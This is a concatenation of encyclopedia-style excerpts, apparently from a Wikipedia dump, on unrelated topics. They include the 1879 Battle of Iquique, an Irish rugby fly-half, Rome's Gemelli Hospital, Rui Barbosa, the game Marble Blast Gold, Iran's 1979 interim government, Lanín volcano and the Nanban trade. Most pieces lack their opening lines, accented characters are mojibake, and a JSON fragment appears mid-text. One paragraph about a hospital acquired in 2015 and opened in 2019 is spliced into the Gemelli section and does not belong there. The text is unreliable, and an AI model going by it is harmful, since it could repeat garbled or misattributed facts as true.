managed to present his side at an angle to spur the monitor Hu√°scar, but this time he opened a water route, entering pouring into the powder magazine and machines. The ship by then had a crew shortage and without more ammunition than he had on deck he could not mount an effective defense. Hu√°scar again fired guns at such close range that they killed several crew members including engineers and firemen who went up on deck and washed away the officers' mess room, which was then also the ship's clinic. Sublieutenant Ignacio Serrano boarded Hu√°scar with eleven more men, armed with machetes and rifles but they were again unsuccessful, falling on the deck of the monitor to the Gatling guns and the monitor's crew, some dying immediately due to bullet wounds sustained. Serrano was then the only survivor and had received several shot wounds in the groin. Grau quickly had him picked up and carried to the infirmary in a state of shock, where they left him next to the dying petty officer Aldea. Twenty minutes later Hu√°scar rammed Esmeralda a third time, this time in the sector of the mizzen mast accompanied by two guns. The corvette leaned forward and began to sink. While Esmeralda was sinking, the last cannon shot was fired by Midshipman Ernesto Riquelme. The Chilean flag was the last part of the warship to go underwater, still flying and nailed to the mizzen-mast. It was 12.10 pm at midday, and Grau realized that many Chilean sailors and marines (sources point out that 57 survived) were trying to avoid the suction of their sinking ship, and their captain had died hours before. Grau ordered boats to be lowered and for the enemy survivors to be rescued before they drowned. The Chilean sailors seeing the Peruvians maneuvering on Huascars deck thought at first they were going to be shot, but were very nonplussed when those who they thought were their murderers proved to actually be their saviors and picked them up, one by one. Independencia was in pursuit of Covadonga, which was heading south of the port of Iquique. Covadonga stuck close to the beach in the bay of Chiquinata, as Independencia had a deeper draft, until the latter came on to the rocks and shallow waters of Punta Gruesa and grounded. Commander Condell ordered an attack on Independencia which resulted in it being sunk and its crew fleeing using its lifeboats, with only 20 of its crew left. Condell ordered to shoot the survivors justifying his action because the Peruvian flag was still in the mast. The difference in attitude between the Chilean commander Condell and the Peruvian commander Grau is often noted by Peruvian maritime historians. Grau had ordered the rescue of the 57 survivors of Esmeralda, but at 2:20 pm saw Independencia away being shelled by Covadonga, and went to engage, arriving at 3:10 pm. He found Independencia stranded in the shallow water with 20 surviving crew members aboard, including More, since the rest had landed in boats on the shore. The Peruvian armored ship continued the pursuit of Covadonga for three hours until Miguel Grau, convinced that the distance that separated them it could not be shortened before sunset, he returned to the aid of Independencia. Grau estimated then that the loss of the frigate was complete and ordered the ship burnt after taking off the remaining crew. Aftermath The Sinking of Emeralda with its crew in the Naval Combat of Iquique, by Nicol√°s Guzm√°n Bustamante After the battle, Rear Admiral Grau gave orders that Prat's personal effects (his diary, uniform and sword among others) were to be returned to his widow. When she received them, she also received a letter from the Peruvian flag officer describing the valor and bravery her late husband had shown during the engagement. In Chile, news reached the country via a underwater telegraph cable in Valparaiso. On Saturday, the 24th of May, the Chilean Navy General Staff and the Naval High Command convened a special meeting about the events in Iquique and Punta Gruesa on 21 May, and sent reports of the battles to the War Department in Santiago, resulting in a mass conscription draft being ordered in response. In the coming days many men enlisted into both the Army and the Navy, eager to honor the fallen and help the country win the conflict. The Battle of Iquique was a clear Peruvian victory; the blockade on Iquique was lifted and Chilean forces temporarily left the area. However, Peru's loss of the Independencia, one of its most powerful warships, in the following battle of Punta Gruesa was strategically costly, while Chile only lost one of its oldest wooden warships. Also, Captain Prat's sudden death while on duty inspired thousands of Chilean youths to join the army and the navy. This is considered by Chilean historians to be one of the most important factors leading to the Chilean victory in the war. Years later, Prat became so embedded in the Chilean popular conscious that newspapers started to use the term \\"Pratiotism\\" to refer to \\"Patriotism\\". Since 1905, the date of the battle has been made a Chilean national holiday as Naval Glories Day (Dia de las Glorias Navales) and is honoured with celebrations all over the nation. However, it was not only Prat that was being honoured. Grau, now known as the \\"Gentleman of the Seas\\" due to his actions in the battle and later for his noble gesture toward Prat's widow and the surviving crewmembers, became honoured in both Peru and Chile as a gallant naval hero.

He played 72 times for Ireland, scoring 560 points, including 6 tries, and at the time of his international retirement was Ireland's most capped outhalf. He played his club rugby for Ulster, captaining Ulster to victory in the 1998-99 Heineken Cup. He has also had a successful coaching career with Ulster Rugby and Gloucester Rugby. Early career Born 10 September 1971, Belfast, Northern Ireland, Humphreys led the Ireland Schools' side to the Triple Crown in 1992 when he was at Ballymena Academy. While at Oxford, at the 1995 Varsity Match Humphreys scored all Oxford's points (a try, conversion, drop goal and three penalties) in their defeat by Cambridge 21‚Äì19. Irish International Humphreys was a formidable outside half with excellent positional kicking from the hand, accurate and consistent goal kicking plus devastating acceleration from a standing start which regularly set up try- scoring moves in the three-quarter line. In addition, his drop goal was a vital part of Ulster and Ireland's armoury in the late stages of close games. Humpreys has made an outstanding contribution to Irish Rugby, as well as notching up an impressive tally of international caps. Humphreys has also been capped for the Barbarians Humphreys represented Ireland at A, U21 and Schools Levels. Humphreys made his Ireland debut against France on 17 February 1996. Later in his career, Humphreys suffered from inconsistent form, and competed with Munster's Ronan O'Gara, who would eventually surpass him as Ireland's most-capped fly-half, for a place in the Ireland team. Humphreys played for Ireland at the 2003 Rugby World Cup, sharing time at the flyhalf position and sharing kicking duties with Ronan O'Gara. In the 2003‚Äì4 season Humphreys lost his place in the Ireland side. Humphreys played in Ireland's summer 2005 tests against Japan, captaining the side twice, with O'Gara on Lions duty. In November 2005, he played against New Zealand and Australia, and captained Ireland for the fifth time against Romania.

In 2004 Humphreys scored 17 points in the Celtic Cup final against Edinburgh as Ulster ran out 21-27 winners. Humphreys cemented a reputation for last-ditch heroics in the final match of the 2005‚Äì06 season against the Ospreys. Ulster had gone into the final week of competition narrowly leading the Celtic League over rivals Leinster. With Ulster two points behind the Ospreys with just four minutes to go, Humphreys kicked a 40-metre drop goal to clinch the game and the league for Ulster.

With 1575 beds, it is the second-largest hospital in Italy, the largest hospital in Rome and one of the largest private hospitals in Europe. It serves as the teaching hospital for the medical school of the Universit√† Cattolica del Sacro Cuore (the largest privately owned university in Italy, founded in 1921 in Milan), and owes its name to the university founder, the Franciscan friar, physician and psychologist Agostino Gemelli. The hospital provides free medical assistance as part of the Italian national health system as well as paid-for \\"private\\" assistance in dedicated hotel-style wards. History and structure Construction began in 1959 on the hill of Monte Mario in Rome, and the hospital opened its doors in July 1964. The hospital hosts facilities for both basic and clinical research, on-site housing for medical students, canteens, cafeterias, one restaurant, one bookshop and two medical libraries. Undergraduate and postgraduate Medical studies, Nursing sciences, Physiotherapy and a variety of other clinical subjects takes place at the main building. Four further buildings are open to the public: the \\"Biological Institutes\\", the \\"Protected Health Residence\\", the combined \\"Institute of Infectious Diseases\\" and \\"Centre for the Medicine of Aging\\". In the early 2000s, a new building was added to the main body, which hosts the Accident and Emergency department, most of the operating theatres and several laboratories. The buildings are surrounded by parks and meadows. The original manorial villa, built long before the site was chosen to build the hospital and previously used as a convent, now serves as the Institute of Bioethics, as well as the main university Church. Main entrance to the hospital with the statue of Pope John Paul II Organizational model and activity Since 2015, the Hospital is organized into 21 areas grouped in 8 departments, whose aim is to coordinate healthcare, training, education and research roles assigned to the areas they cover. The Hospital uses \\"Critical Pathways\\" to map, integrate and assess every phase involved in providing care for key health problems. Auditorium In 2015 alone, almost 95,000 patients were hospitalised and more than 45,000 surgical operations were conducted. 80,000 patients where treated in the Emergency Department, 10,000 blood dialysis sessions and more than 6 million radiological procedures were conducted. The hospital staff includes more than 5,000 employees, of whom almost 1,000 physicians and more than 2,000 nurses. Every day, the hospital premises and the whole campus host an estimated number of 30,000 people. Each year the hospital consumes around 50 million kWh and 16 million cubic metres of natural gas. Its co-generation system provides around 60% of the energy that is needed for electricity, heating and cooling, making it one of the largest infrastructures of this kind in the civil and hospital sectors in Italy. Compliance with existing regulations have resulted in the Hospital obtaining ISO 50001 certification from the Bureau Veritas agency. Gemelli Hospital was the first teaching hospital in Italy ever to receive this certification. The Hospital and the University are focused on research: in 2015 alone, 1500 scientific papers were published, with 323 scientific experiments underway and 17 patents developed by internal researchers thanks ‚Ç¨16,000,000 research fundings, provided both by Italian, European and international agencies. Advanced technologies and areas of excellence Hybrid operating room for cardiovascular surgery at the Gemelli Hospital Since 2015, the hospital hosts one of the largest and newest hybrid operating theatres in Europe, a highly specialised Oncological Radiotherapy Center (Gemelli ART) unique in Italy and the NEMO (NEuroMuscular Omnicentre) Clinical Center, highly specialized in taking care of people affected with neuromuscular diseases including Amyotrophic lateral sclerosis (ALS), Spinal Muscular Atrophy (SMA) and Muscular Dystrophies. More recently, a 1,200 sqm center dedicated to medical, surgical and diagnostic simulation (IPSE Center, Interactive Patient Simulation Experience) has been inaugurated. The Gemelli is one of Italy‚Äôs top centres for colorectal tumours, as well as tumours of the stomach, liver, biliary system and pancreas, and also for transplants. The Endocrinology-Metabolic Diseases Area has clinical-surgical units specialised in managing the main endocrine and metabolic illnesses. The hospital boasts one of Italy‚Äôs leading case statistics in terms of management and medical-surgical therapy for diseases of the thyroid, adrenal gland and pituitary gland. The mortality rate for cardiac surgery is among the lowest in Italy. Medicinema In 2015, in collaboration with the MediCinema Italy Onlus, the Hospital completed and inaugurated the 130 seats MediCinema theatre which can accommodate patients in wheelchairs and beds. It is the first hospital in Italy to have premises set aside for ‚Äúcinematherapy‚Äù and relief therapy for patients and their family members.

The hospital, acquired by QFE through the European investment platform in May 2015, underwent major structural and technological interventions that led to its opening in 2019. Pope John Paul II and other notable patients Pope John Paul was repeatedly treated at the Gemelli Hospital The Gemelli became the focus of international attention during the pontificate of Pope John Paul II who, in 1981, received emergency surgery after Mehmet Ali Aƒüca's failed assassination attempt. He returned at various times, up to a few weeks before his death in 2005. Other famous ex-patients include politicians Giulio Andreotti, Walter Veltroni and Francesco Cossiga, Nobel Peace Prize laureate Mother Teresa, theoretical physicist Stephen Hawking, priest Georg Ratzinger (elder brother of Pope Benedict XVI), footballers Francesco Totti and Daniele De Rossi and Canadian filmmaker Damian Pettigrew to name a few. In June 2009 a statue of Pope John Paul II was unveiled in front of the hospital building.

Early life  Born in Salvador, Bahia, he was a federal representative, senator, Minister of Finance and diplomat. For his distinguished participation in the 2nd Hague Conference, defending the principle of equality among nations, he earned the nickname \\"Eagle of the Hague\\". He ran unsuccessfully for the Presidency of Brazil in 1910, 1914 and in 1919. Rui Barbosa gave his first public speech for the abolition of slavery when he was 19. For the rest of his life he remained an uncompromising defender of civil liberties. Slavery in Brazil was finally abolished by the Lei √Åurea (\\"Golden Law\\") in 1888. Part of Barbosa's legacy to history is that he authorised, as minister of finance on 14 December 1890, the destruction of most government records relating to slavery.. The avowed reason for this destruction, which took several years to be enacted and was followed by his successors, was to erase the \\"stain\\" of slavery on Brazilian history.. However, historians today agree that Barbosa aimed to prevent any possible indemnization of the former slave-owners for this liberation. Indeed, eleven days after the abolition of slavery, a law project was deposed at the Chamber, proposing some indemnization to the slave owners.  Political career  = Political stances = Barbosa's liberal ideas were influential in drafting of the first republican constitution. He was a supporter of fiat money, as opposed to a gold standard, in Brazil. During his term as finance secretary, he implemented far-reaching reforms of Brazil's financial regime, instituting a vigorously expansionist monetary policy. The result was chaos and instability: the so-called fiat experiment resulted in the bubble of encilhamento, a dismal politic-economic failure. Due to his controversial role during it, in the following administration of Floriano Peixoto, he was forced into exile until Floriano's term ended. Years later, after his return he was elected as a Senator. He headed the Brazilian delegation to the 2nd Hague Conference and was brilliant in its deliberations. As candidate of the Civilian Party in the presidential election of 1910, Barbosa waged one of the most memorable campaigns in Brazilian politics. He was not successful and lost to Marshal Hermes da Fonseca. He ran again in the elections of 1914 and 1919, both times losing to the government candidate. During World War I, he played a key role among those who advocated the Allied cause, arguing that Brazil should be more involved in the war. Barbosa died in Petr√≥polis, near Rio de Janeiro, in 1923.Cardim, Carlos Henrique (2007) A raiz das coisas. Rui Barbosa: o Brasil no Mundo (The root of things.

It was pre-installed on some Apple Inc. computers like the iMac, iBook, and Mac mini. It is also available for Windows operating systems as well as various Linux distributions. The sequel, Marble Blast Ultra, was released a few years later for the Xbox 360 platform with new features and improved graphics. Marble Blast XP, a version for the Net Jet online game system, has updated graphics and a marble selector. Marble Blast Gold was also ported over to the Microsoft Xbox through the Xbox Live Arcade service the following year with enhanced graphics. The game was originally released in December 2002 as Marble Blast and then updated in May 2003, being renamed as Marble Blast Gold. At some point during 2003, it was also licensed to eGames to be resold under the name Marble Blaster.http://www.garagegames.com/community/forums/viewthread/11149/1#comment-73350 Modifications of the game have also been created by the Marble Blast community, most notably Marble Blast Platinum, Marble Blast Powered Up, and Marble Blast Emerald. Gameplay Basic gameplay involves taking the perspective of an autonomous marble moving on its own from a start pad to an end pad, without falling out of bounds. Levels may contain hazards to make this more difficult. The player controls the marble spin, and therefore movement, and can also make the marble jump. There is a variety of power-ups available to the player, which are collected by touching them with the marble. Some levels must be completed within a Qualification time, to increase difficulty. Each level also has a \\"Gold Time\\", an additional challenge to complete the level in a specified time-frame. Each gold time is always possible but usually involves finding hidden powerups and/or taking shortcuts. Some levels require a number of gems to be picked up before the level can be finished. There are 100 levels, categorized by difficulty: 24 Beginner, 24 Intermediate, and 52 Advanced. List of Beginner Levels Level 1 teaches the player how to move the marble (default movement controls being the W, A, S, and D keys). Level 2 is the first level in which gems appear. The player must collect them and head to the finish. Level 3 introduces jumping. Level 4 introduces the Super Jump Powerup. Level 5 introduces moving platforms. Level 6 introduces the Super Speed Powerup. Level 7 introduces elevators. Level 8 introduces the ability to move while in the air. Level 9 introduces the Gyrocopter. Level 10 introduces a Time Modifier and qualify times. Level 11 introduces the super-bounce powerup. Level 12 introduces Gravity Modifiers. Level 13 introduces the Shock Absorber Powerup. Level 14 does not introduce any new features but signs. Level 15 introduces different surfaces such as mud, grass, and space. Level 16 introduces round bumpers. Level 17 introduces duct fans. Level 18 introduces mines. Level 19 introduces trapdoors. Level 20 introduces tornadoes. Level 21 introduces gaps in the floor. Levels 22-24 are tests to get used to the hazards and power-ups that have been introduced to the player. =Power-ups= There are 7 power-ups available to the player. Non-inventory power-ups are instantly activated when touched, and inventory power-ups are activated by the player. Only one inventory power-up can be held at a time, although multiple power-ups can be used by stacking their effects in a certain way. Inventory Power-ups Super Jump: Gives the marble an instant upward boost. * Super Speed: Gives the marble an instant speed boost in the direction the camera is pointing in. * Shock Absorber: Disables the marble from bouncing for 5 seconds. While active, the marble is surrounded by a semi-transparent sphere. * Super Bounce: Allows the marble to bounce much higher than usual for 5 seconds. While active, the marble is surrounded by a semi-transparent sphere. * Gyrocopter: Gives the marble the ability to fly for 5 seconds. The marble can also jump much higher, and falls much more slowly. Non-Inventory Power-Ups Time Travel: Freezes the in-game timer for a varying amount of time, usually 5 seconds, allowing for lower finishing times. * Gravity Modifier: Instantly changes the direction of gravity in the level to the direction of the arrow on the Powerup. =Hazards= Hazards are scattered throughout levels to make it more difficult to complete challenges. Most hazards can also be used by the player to their advantage, usually to launch them upwards or to increase their speed. The hazards in unmodded Marble Blast Gold are: * Trapdoors: Acts as a solid surface, but flips open when the marble rolls on it. Reset after a short period of time. * Bumpers: Violently bump the marble away when touched. * Tornadoes: Suck in the marble and vigorously shake it around before spitting it out. The marble goes high up. * Mines: Explode on contact and are like high-powered bumpers. Regenerate after a short period of time. * Fans: Blow the marble away in the direction they are pointing. * Oil Slicks: Small patches of oil that cause the marble to slip around. =Frictions= There are various friction surfaces through the game, increasing or decreasing traction of the marble rolling on them. Higher frictions allow the marble to change speed direction more easily. Steeper slopes are easier to climb if their surfaces are high in friction. On the other hand, lower frictions make it more difficult for the marble to do these same things. The frictions in unmodded Marble Blast Gold are: * Normal: Medium traction. * Mud: Low traction. * Space: Extremely little to no traction. * Grass: High traction. * Ramp: Very high traction (only appears in the levels Three Fold Maze and Escher's Race). * Oil: Low traction (same as mud, but appears in the form of an oil slick). Custom Levels Marble Blast Gold has support for user-created custom levels, which may be shared between users. To date, there are over 1,850 downloadable custom levels for Marble Blast Gold.http://www.marbleblast.com/index.cgi?board=newlevelsboard&action;=display&thread;=7737 Reception Marble Blast Gold received critical acclaim from critics upon release. On GameRankings, Marble Blast Gold received an 8.4/10 rating, \\"Addictive gameplay and sweet levels lead to some of the best fun that $14.99 can buy\\". On Gametunnel, the game was rated 9/10 overall, \\"Marble Blast Gold is another great entry into the marble genre and a showpiece for the Torque engine. Highly recommended!\\" On GamersInfo, the reviewer noted: \\"The game can be a lot of fun, especially if you are the type that likes to challenge your hand‚Äìeye coordination.\\" Discontinuation On January 31, 2011, GarageGames lost the distribution rights of several of its games, including Marble Blast Gold, to InterActive, Corp. MBG was eventually taken down from other sites as well, such as RealArcade. This also caused the direct sequel, Marble Blast Ultra, to be delisted from Xbox Live Arcade later in 2011. On February 1, 2011, Marble Blast Gold was removed from the GarageGames store and is no longer available for purchase. However, the full game can still be downloaded for free at Marble Blast. Demos for Windows, Mac, and Linux are also still available.https://marbleblast.com/index.php/downloads/mbg The license to the Marble Blast franchise is retained by IAC.

It ran on Friday nights in 2005 on BBC One. Dom Joly made his name on the similar series Trigger Happy TV on Channel 4, and it was from its great success that he was hired by the BBC to produce new programming. His first effort was an unsuccessful spoof chat show named This Is Dom Joly. The lack of success in conventional comedy prompted him to go back to his hidden camera roots and started to create a new series which was very similar to Trigger Happy TV, with short stunts overlaid with a soundtrack. He was the main participant in these stunts. As with his previous work, the programme had an emphasis on surrealism, with sketches such as a spying gnome and nerds taunting skateboarders. Where Trigger Happy TV took place in various places around the United Kingdom, the larger budget of World Shut Your Mouth allowed for international travel and filming, and many of the stunts took place at, or near, major international landmarks. There were subtle changes in directorial style, with zooms and close-up shots of the public's reaction to the various pranks. The team working on World Shut Your Mouth was also larger. Trigger Happy TV was mainly the work of Joly and Sam Cadman, with Joly doing the stunts and Cadman filming. In World Shut Your Mouth, Dom Joly did the stunts, and produced the show with Richard Webb. Janet Knipe directed and Al Campbell filmed. The show also starred Danny Wallace in minor supporting roles for some of the stunts, and he also helped develop some ideas for the show. In January 2005 World Shut Your Mouth began to be shown at 10.35 Friday night on BBC One. Despite its critical success it only ran for one series, which was later released on BBC DVD on 9 May 2005. The DVD featured an entire extra episode that never aired, plus audio commentary on all the episodes. The series was named after the 1987 Julian Cope hit \\"World Shut Your Mouth\\" and Cope's 1984 album of the same name.

The regime was headed by Mehdi Bazargan, one of the members of the Freedom Movement of Iran, and formed on the order of Ruhollah Khomeini (known as the Ayatollah Khomeini) on 4 February 1979. From 4 to 11 February, Bazargan and Shapour Bakhtiar, the Shah's last Prime Minister, both claimed to be the legitimate prime minister; Bakhtiar fled on 11 February. Mehdi Bazargan was the prime minister of the interim government and introduced a seven-member cabinet on 14 February 1979. Ebrahim Yazdi was elected as the Foreign Minister. The constitution of the Islamic Republic of Iran was adopted by referendum on 24 October 1979. Before it could come into force on 3 December 1979, however, the government resigned on 6 November soon after the taking over of the American embassy, an act the government opposed but revolutionary leader Khomeini reluctantly supported. The Council of the Islamic Revolution then served as the country's government until the formation of the first Islamic Consultative Assembly on 12 August 1980. Bazargan was elected to the first Islamic Consultative Assembly representing Tehran. Formation of the interim government When Ayatollah Khomeini, the leader of the Iranian revolution, came back to Iran after his 15-year exile, he appointed Mehdi Bazargan as the head of the interim government. On 4 February 1979, Ruhollah Khomeini issued a decree appointing Bazargan as the prime minister of \\"The Provisional Islamic Revolutionary Government\\" (PRG). His decree stated: Elaborating further on his decree, Khomeini made it clear that Iranians were commanded to obey Bazargan and that this was a religious duty. > As a man who, though the guardianship [Velayat] that I have from the holy > lawgiver [the Prophet], I hereby pronounce Bazargan as the Ruler, and since > I have appointed him, he must be obeyed. The nation must obey him. This is > not an ordinary government. It is a government based on the sharia. Opposing > this government means opposing the sharia of Islam ... Revolt against God's > government is a revolt against God. Revolt against God is > blasphemy.Khomeini, Sahifeh-ye Nur, vol. 5, p. 31, translated by Baqer Moin > in Khomeini (2000), p. 204 Khomeini's announcement came days before the army's official statement announcing the army's (Bakhtiar's last hope) neutrality in conflicts between Khomeini's and Bakhtiar's supporters. Bakhtiar fled on the same day, 11 February, the day that is officially named as Islamic Revolution's Victory Day. The PRG is often described as \\"subordinate\\" to the Revolutionary Council, and having had difficulties reigning in the numerous committees which were competing with its authority.Arjomand, Turban for the Crown, (1988) p.135 Members of the cabinet According to Mohammad Ataie, the cabinet was made up of two main factions, moderates and radicals. Most of cabinet members were nationalist veterans from the Freedom Movement of Iran and the National Front. Bazargan reshuffled his cabinet several times because of resignation of ministers that were unable to cope with parallel sources of power. In several cases a ministry was supervised by an acting minister or Bazargan himself. List of members of Bazargan's cabinet was as follows: Resignation The Prime Minister and all members of his cabinet resigned en masse on 6 November 1979 after American Embassy officials were taken hostage two days earlier on 4 November 1979. In his letter to Khomeini, Bazargan stated that \\"...repeated interferences, inconveniences, objections and disputes have made my colleagues and me unable to continue [meeting] our duties ...\\". Power then passed into the hands of the Revolutionary Council. Bazargan had been a supporter of the original revolutionary draft constitution rather than theocracy by Islamic jurist, and his resignation was received by Khomeini without protest, saying \\"Mr. Bazargan ... was a little tired and preferred to stay on the sidelines for a while.\\" Khomeini later described his appointment of Bazargan as a \\"mistake\\".Moin, Khomeini,(2000), p. 222 Bazargan, on the other hand, described the government as a \\"knife without blade.\\" See also Interim Government of Iran (1981) * Iranian Revolution * Iran hostage crisis References 1979 establishments in Iran 1979 disestablishments in Iran States and territories established in 1979 States and territories disestablished in 1979 Government of Iran Iranian Revolution Provisional governments Cabinets of Iran Revolutionary organizations Organisations of the Iranian Revolution Former polities of the Cold War Ruhollah Khomeini ","title":"Interim Government of Iran"},{"id":"30874212","text":"Lan√≠n Volcano in Argentina Lan√≠n is an ice-clad, cone-shaped stratovolcano on the border of Argentina and Chile. It forms part of two national parks: Lan√≠n in Argentina and Villarrica in Chile. It is a symbol of the Argentine province of Neuqu√©n, being part of its flag and its anthem. Although the date of its last eruption is not known, it is estimated to have occurred within the last 10,000 years. Following the 1906 Valpara√≠so earthquake a local newspaper reported the volcano to have erupted, but a work published in 1917 by Karl Sapper disputed this.Luis E. Lara, Jos√© A. Naranjo and Hugo Moreno, 2004. Lan√≠n volcano (39.5¬∞S), Southern Andes: geology and morphostructural evolution, Revista geol√≥gica de Chile vol. 31. The ascent is regulated by the management of Argentine National Parks and the Argentine National Gendarmerie and is technically relatively simple but has a much higher level of exposure than the neighbouring volcanoes. The nearest towns, usually employed as a base for climbers, are Puc√≥n in Chile and Jun√≠n de los Andes in Argentina. There are two paths to the summit: one on the north, starting at 1,200 metres above mean sea level near Tromen Lake and the international Mamuil Malal Pass, accessible via Neuqu√©n's Provincial Route 60; and one on the south, starting beside Huechulafquen Lake, accessible via Provincial Route 61. Geography and geology Lan√≠n lies at the Atlantic-Pacific water divide of the Andes, being for that reason located on the Argentina-Chile border according to the 1881 border treaty between these countries. To the north and south lie the Tromen and Paimun Lakes, respectively. Lan√≠n is the easternmost volcano of a north- west south-east oriented chain of three large stratovolcanoes, Villarrica being the westernmost one and Quetrupill√°n the one in the middle. This alignment is attributed to the existence of a fault beneath the volcanoes. In historical times, Lan√≠n has been the least active of these volcanoes. Apart from Quetrupill√°n and Villarrica, there are a number of old eroded remains of stratovolcanoes in the alignment. The volcano itself rests on a basement of gneisses, felsic plutons, and volcaniclastic sequences. The basement rocks constitute a tectonically elevated block limited in the west by the north- south Reigolil-Pirihueico Fault. Ages of ranging from Late Pliocene to Early Pleistocene have been suggested for the oldest known parts of the volcano, which are dacitic lava flows with columnar joints. Basalt is the most common rock of the volcano. Lan√≠n shows overall higher alkali (Na2O plus K2O) to silica ratio than Villarrica, which is interpreted as reflecting a lesser degree of partial melting underneath the volcano and showing that the volcanoes of the chain have distinct source regions in Earth's mantle. Another petrologic characteristic of Lan√≠n is its bimodal volcanism.

It was written in Italian and first published in Venice in 1540. The author was Vannoccio Biringuccio, a citizen of Siena, Italy, who died before it was published. Further editions were published in 1550, 1558, 1559, and 1678, with a (sloppy) French translation by Jacques Vincent being published in 1556, 1572, and 1627.The Pirotechnia of Vannoccio Biringuccio, translated from the Italian with an introduction and notes by Cyril Stanley Smith & Martha Teach Gnudi, New York: The American Institute of Mining and Metallurgical Engineers, 1942, pp. xxi, 458-460.

The Nanban trade began with Portuguese explorers, missionaries, and merchants in the Sengoku period and established long-distance overseas trade routes with Japan. The resulting cultural exchange included the introduction of refined sugar, hand-held firearms, galleon-style shipbuilding, and Christianity to Japan. The Nanban trade declined in the early Edo period with the rise of the Tokugawa Shogunate which feared the influence of Christianity in Japan, particularly the Roman Catholicism of the Portuguese. The Tokugawa issued a series of Sakoku policies that increasingly isolated Japan from the outside world and limited European trade to Dutch traders on the island of Dejima.

First contacts  The samurai Hasekura Tsunenaga in Rome in 1615 (Coll. Borghese, Rome) = Japanese accounts of Europeans = characters for \\"Nanban\\" (lit. \\"Southern barbarian\\"). Following contact with the Portuguese on Tanegashima in 1542, the Japanese were at first rather wary of the newly arrived foreigners. The culture shock was quite strong, especially due to the fact that Europeans were not able to understand the Japanese writing system nor accustomed to using chopsticks. Many foreigners were befriended by Japanese rulers, and their ability was sometimes recognized to the point of promoting one to the rank of samurai (William Adams), and giving him a fief in the Miura Peninsula, south of Edo. = European accounts of Japan = The first comprehensive and systematic report of a European about Japan is the Tratado em que se cont√™m muito sucinta e abreviadamente algumas contradi√ß√µes e diferen√ßas de costumes entre a gente de Europa e esta prov√≠ncia de Jap√£o of Lu√≠s Fr√≥is, in which he described Japanese life concerning the roles and duties of men and women, children, Japanese food, weapons, medicine, medical treatment, diseases, books, houses, gardens, horses, ships and cultural aspects of Japanese life like dances and music. Several decades later, when Hasekura Tsunenaga became the first Japanese official arrving in Europe, his presence, habits and cultural mannerisms gave rise to many picturesque descriptions circulating among the public: :\\"They never touch food with their fingers, but instead use two small sticks that they hold with three fingers.\\" :\\"They blow their noses in soft silky papers the size of a hand, which they never use twice, so that they throw them on the ground after usage, and they were delighted to see our people around them precipitate themselves to pick them up.\\" :\\"Their Scimitar -alike swords and daggers cut so well that they can cut a soft paper just by putting it on the edge and by blowing on it.\\" (\\"Relations of Mme de St Tropez\\", October 1615, Biblioth√®que Inguimbertine, Carpentras). Renaissance Europeans were quite fond of Japan's immense richness in precious metals, mainly owing to Marco Polo's accounts of gilded temples and palaces, but also due to the relative abundance of surface ores characteristic of a volcanic country, before large-scale deep-mining became possible in Industrial times. Japan was to become a major exporter of copper and silver during the period. Japan was also noted for its comparable or exceptional levels of population and urbanisation with the west (see List of countries by population in 1600), and at the time, some Europeans became quite fascinated with Japan, with Alessandro Valignano even writing that the Japanese \\"excel not only all the other Oriental peoples, they surpass the Europeans as well\\". Early European visitors noted the quality of Japanese craftsmanship and metalsmithing. This stems from the fact that Japan itself is rather poor in natural resources found commonly in Europe, especially iron. Thus, the Japanese were famously frugal with their consumable resources. Much later sources, however, most notably those written after the end of Japan's isolation period, report Japanese blades and swords in general as good quality weapons with a notable artistic value.  Portuguese trade in the 16th century  The Portuguese \\"Japan Route\\" Nanban ships arriving for trade in Japan. 16th-century six-fold by≈çbu (lacquer and gilded screen), by Kan≈ç Naizen Portuguese traders landing in Japan A Portuguese carrack in Nagasaki, 17th century. Ever since 1514 that the Portuguese had traded with China from Malacca, and the year after the first Portuguese landfall in Japan, trade commenced between Malacca, China, and Japan. The Chinese Emperor had decreed an embargo against Japan as a result of piratical wokou raids against China - consequently, Chinese goods were in scarce supply in Japan and so, the Portuguese found a lucrative opportunity to act as middlemen between the two realms. Trade with Japan was initially open to any, but in 1550, the Portuguese Crown monopolized the rights to trade with Japan. Henceforth, once a year a fidalgo was awarded the rights for a single trade venture to Japan with considerable privileges, such as the title of captain-major of the voyage to Japan, with authority over any Portuguese subjects in China or Japan while he was in port, and the right to sell his post, should he lack the necessary funds to undertake the enterprise. He could charter a royal vessel or purchase his own, at about 40,000 xerafins. His ship would set sail from Goa, called at Malacca and China before proceeding to Japan and back. In 1554, captain-major Leonel de Sousa negotiated with Chinese authorities the re-legalization of Portuguese trade in China, which was followed by the foundation of Macau in 1557 to support this trade. The state of civil-war in Japan was also highly beneficial to the Portuguese, as each competing lord sought to attract trade to their domains by offering better conditions. In 1571, the fishing village of Nagasaki became the definitive anchorage of the Portuguese and in 1580, its lord, Omura Sumitada, the first Japanese lord to convert to Christianity, leased it to the Jesuits \\"in perpetuity\\". The city subsequently evolved from an unimportant fishing village to a prosperous and cosmopolitan community, the entirety of which was Christian. In time, the city would be graced with a painting school, a hospital, a charitable institution (the Miseric√≥rdia) and a Jesuit college. =The vessels= Among the vessels involved in the trade linking Goa and Japan, the most famous were Portuguese carracks, slow but large enough to hold a great deal of merchandise and enough provisions safely through such a lengthy and often hazardous (because of pirates) journey. These ships initially had about 400-600 tons burden but later on could reach as many as over 1200 or 1600 tons in cargo capacity, a rare few reaching as many as 2000 tons - they were the largest vessels afloat on Earth, and easily twice or three times larger than common galleons of the time, rivalled only in size by the Spanish Manila galleons. Many of these were built at the royal Indo- Portuguese shipyards at Goa, Bassein or Daman, out of high-quality Indian teakwood rather than European pine, and their build quality became renown: the Spanish in Manila favoured Portuguese-built vessels, and commented that they were not only cheaper than their own, but \\"lasted ten times as long\\". The Portuguese referred to this vessel as the nau da prata (\\"silver carrack\\") or nau do trato (\\"trade carrack\\"); the Japanese dubbed them kurofune, meaning \\"black ships\\", on account of the colour of their hulls, painted black with pitch for water-tightening, and later the name was extended to refer to Matthew C. Perry's black warships that reopened Japan to the wider world in 1853. In the 16th century, large junks belonging to private owners from Macau often accompanied the great ship to Japan, about two or three; these could reach about 400 or 500 tons burden. After 1618, the Portuguese switched to using smaller and more maneuverable pinnaces and galliots, to avoid interception from Dutch raiders. =Traded goods= By far the most valuable commodities exchanged in the \\"nanban trade\\" were Chinese silks for Japanese silver, which was then traded in China for more silk. Although accurate statistics are lacking, it's been estimated that roughly half of Japan's yearly silver output was exported, most of it through the Portuguese, amounting to about 18 - 20 tons in silver bullion. The English merchant Peter Mundy estimated that Portuguese investment at Canton ascended to 1,500,000 silver taels or 1,000,000 Spanish reales. The Portuguese also exported surplus silk from Macau to Goa and Europe via Manila. A Japanese lacquerware produced and exported at the request of the Society of Jesus. Azuchi‚ÄìMomoyama period, 16th 